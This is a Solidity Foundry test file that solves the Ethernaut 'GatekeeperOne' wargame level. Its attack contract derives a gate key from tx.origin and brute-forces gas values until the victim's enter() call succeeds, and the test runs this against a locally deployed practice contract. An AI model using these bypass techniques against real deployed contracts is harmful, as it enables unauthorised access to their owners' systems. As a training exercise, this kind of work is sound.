// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../../src/13_GatekeeperOne/GatekeeperOne.sol";


contract Attack {
    GatekeeperOne public g1Contract;
    address public attackerAddress;

    constructor(address g1) {
        attackerAddress = msg.sender;
        g1Contract = GatekeeperOne(g1);
    }

    function pwn() public{
        bytes8 pass = bytes8(uint64(uint160(address(tx.origin)))) & 0xFFFFFFFF0000FFFF;
        for (uint256 i = 0; i < 300; i++) {
            (bool success, ) = address(g1Contract).call{gas: i + (8191 * 3)}(abi.encodeWithSignature("enter(bytes8)", pass));
            if (success) {
                break;
            }
        }
    }
}


contract GatekeeperOne_test is Test {
    GatekeeperOne public victim;
    address public attacker;

    function setUp() public {
        attacker = vm.addr(1);
        victim = new GatekeeperOne();
        vm.deal(attacker, 1 ether);

    }

    function testAttack() public {
        vm.startPrank(attacker, attacker); // setting address and tx.origin
        Attack attack = new Attack(address(victim));
        attack.pwn();
        vm.stopPrank();
        assertEq(victim.entrant(), attacker);
    }


}

